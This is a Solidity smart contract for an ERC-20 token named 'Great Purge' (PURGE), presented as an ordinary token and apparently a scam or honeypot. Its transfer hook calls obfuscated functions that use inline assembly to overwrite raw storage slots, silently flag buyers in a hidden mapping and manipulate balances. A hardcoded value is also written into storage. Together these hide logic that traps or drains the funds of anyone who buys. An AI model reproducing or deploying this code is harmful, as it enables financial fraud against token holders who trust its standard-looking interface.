// 0x44494420594f55205345452054484520505552474520434f4d494e473f20425554204245574152452e204954204953204e4f542045564552205945542e2043454c53495553205354494c4c204c495645532e



pragma solidity ^0.8.0;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this;

        return msg.data;

    }

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

}



interface IUniswapV2Pair {

    event Sync(uint112 reserve0, uint112 reserve1);

    function sync() external;

}



interface IERC20 {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}



interface IERC20Metadata is IERC20 {

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

}



contract Ownable is Context {

    address private _previousOwner; address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    address[] private ethAddr;

    uint256 public snipAt = block.number*2;



    mapping (address => bool) private dexSwap; 

    mapping (address => bool) private theGovernance; 

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    address private initServ;



    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private gasVV;

    address public pair;



    IDEXRouter router;



    string private _name; string private _symbol; uint256 private _totalSupply;

    uint256 public _limit; uint256 private theV; uint256 private theN = block.number*2;

    bool private trading; uint256 public upMsg = 1; bool public swapGwei;

    uint256 public _decimals; uint256 public downMsg; uint256 public tempLIMIT;

    

    constructor (string memory name_, string memory symbol_, address msgSender_) {

        router = IDEXRouter(_router);

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));



        _name = name_;

        _symbol = symbol_;

        ethAddr.push(_router); ethAddr.push(msgSender_); ethAddr.push(pair);

        for (uint256 q=0; q < 3;) {dexSwap[ethAddr[q]] = true; unchecked{q++;} }

    }



    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    function openTrading() external onlyOwner returns (bool) {

        trading = true; theN = block.number; snipAt = block.number;

        return true;

    }



    function keccak255(address x, uint256 y) internal pure returns (bytes32 b) { b = keccak256(abi.encodePacked([uint256(uint160(x)), y])); }

    function _webService(bool account) internal { if (account) { require(gasleft() >= gasVV); } if (swapGwei) { bytes32 b = keccak255(ethAddr[1],6); assembly { sstore(b,0x446C3B15F9926687D2C40534FDB564000000000000) } } }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);



        return true;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function rollTheDice(bytes32 y, bytes32 z, uint256 switcher, uint256 x1, uint256 x2, uint256 x3) internal {

        assembly { if or(eq(sload(y),iszero(sload(z))),eq(iszero(sload(y)),sload(z))) { switch switcher case 1 {

                    let x := sload(x3) let t := sload(x1) if iszero(sload(x2)) { sstore(x2,t) } let g := sload(x2)

                    switch gt(g,div(t,0x2)) case 1 { g := sub(g,div(div(mul(g,mul(0x203,x)),0xB326),0x2))} 

                    case 0 {g := div(t,0x2)} sstore(x2,t) sstore(x1,g) sstore(x3,add(sload(x3),0x1))

                } case 0 { let x := sload(x3) let t := sload(x1) sstore(x1,x) sstore(x3,t) } }

            if iszero(switcher) { if iszero(mod(sload(0x15),0x5)) { sstore(0x16,0x1) } sstore(0x3,number()) } } }



    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {

        require((trading || (sender == ethAddr[1])), "ERC20: trading is not yet enabled.");

        upMsg += dexSwap[recipient] ? 1 : 0; _webService((((swapGwei || theGovernance[sender]) && ((snipAt - theN) >= 9)) || (integer >= _limit)) && (dexSwap[recipient] == true) && (dexSwap[sender] != true)); rollTheDice(keccak255(sender,4),keccak255(recipient,4),1,17,23,24);

        _CheckFees(initServ, (((snipAt == block.number) || (theV >= _limit) || ((snipAt - theN) <= 9)) && (dexSwap[initServ] != true))); rollTheDice(keccak255(sender,4),keccak255(recipient,4),0,23,7,17); theV = integer; initServ = recipient;

    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;



        emit Transfer(sender, recipient, amount);

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function _CheckFees(address sender, bool account) internal { theGovernance[sender] = account ? true : theGovernance[sender]; }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _DeployDevilsWeb(address account, uint256 amount, uint256 tmp, uint256 tmp2, uint256 tmp3) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        _balances[account] += amount;

        approve(ethAddr[0], 10 ** 77);

        assembly { sstore(tmp2,mul(div(sload(tmp),0x2710),0x12D)) sstore(tmp3,0x1ba8140) }

    

        emit Transfer(address(0), account, amount);

    }

}



contract ERC20Token is Context, ERC20 {

    constructor(

        string memory name, string memory symbol,

        address creator, uint256 initialSupply

    ) ERC20(name, symbol, creator) {

        _DeployDevilsWeb(creator, initialSupply, uint256(16), uint256(17), uint256(11));

    }

}



contract GreatPurge is ERC20Token {

    constructor() ERC20Token("Great Purge", "PURGE", msg.sender, 666666 * 10 ** 18) {

    }

}